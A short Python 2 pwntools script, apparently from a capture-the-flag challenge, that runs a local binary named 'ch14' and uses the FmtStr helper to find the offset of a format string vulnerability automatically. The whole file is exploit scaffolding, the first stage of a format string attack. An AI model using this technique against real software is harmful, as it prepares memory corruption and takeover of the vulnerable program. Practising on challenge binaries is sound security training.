from pwn import *

context.log_level = 'debug'

def getoffset(payload):
	name = ['./ch14', payload]
	p = process(name)
	p.recvuntil('fmt=[')
	info = p.recvuntil(']')
	return info
auto=FmtStr(getoffset)
print auto.offset
